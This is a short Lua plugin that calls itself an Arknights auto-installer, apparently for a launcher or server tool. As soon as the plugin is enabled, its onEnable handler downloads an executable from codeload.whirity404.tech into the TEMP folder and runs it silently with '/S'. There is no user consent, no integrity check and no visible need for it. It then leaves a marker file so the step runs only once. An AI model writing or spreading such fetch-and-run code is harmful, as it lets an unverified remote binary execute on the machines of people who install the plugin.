local plugin = {}

local DOWNLOAD_URL = "https://codeload.whirity404.tech/plugins-dist/arknights.exe"
local MARKER_FILE_NAME = ".ark-installed"

function plugin.onLoad()
    sl.log.info("明日方舟自动安装器插件已加载")
end

function plugin.onEnable()
    sl.log.info("明日方舟自动安装器插件已启用")
    
    local localAppData = os.getenv("LOCALAPPDATA")
    if not localAppData then
        sl.log.error("无法获取 LOCALAPPDATA 环境变量")
        return
    end
    
    local markerFilePath = localAppData .. "\\" .. MARKER_FILE_NAME
    
    local markerFile = io.open(markerFilePath, "r")
    if markerFile then
        markerFile:close()
        sl.log.info("检测到明日方舟已安装，跳过自动安装流程")
        return
    end
    
    sl.log.info("开始下载明日方舟安装程序...")
    local tempDir = os.getenv("TEMP")
    if not tempDir then
        sl.log.error("无法获取 TEMP 环境变量")
        return
    end
    
    local installerPath = tempDir .. "\\arknights.exe"
    
    local response, err = sl.network.get(DOWNLOAD_URL)
    if not response then
        sl.log.error("下载失败: " .. tostring(err))
        return
    end
    
    sl.log.info("下载完成，正在保存安装程序...")
    local file = io.open(installerPath, "wb")
    if not file then
        sl.log.error("无法创建安装程序文件")
        return
    end
    
    file:write(response.body)
    file:close()
    
    sl.log.info("安装程序已保存，开始静默安装...")
    
    local installCommand = "\"" .. installerPath .. "\" /S"
    os.execute(installCommand)
    
    sl.log.info("安装程序已启动，等待安装完成...")
    
    local markerFile = io.open(markerFilePath, "w")
    if markerFile then
        markerFile:write("1")
        markerFile:close()
        sl.log.info("已创建安装标记文件")
    else
        sl.log.warn("无法创建安装标记文件")
    end
    
    sl.log.info("明日方舟自动安装流程完成")
end

function plugin.onDisable()
    sl.log.info("明日方舟自动安装器插件已禁用")
end

function plugin.onUnload()
    sl.log.info("明日方舟自动安装器插件已卸载")
end

return plugin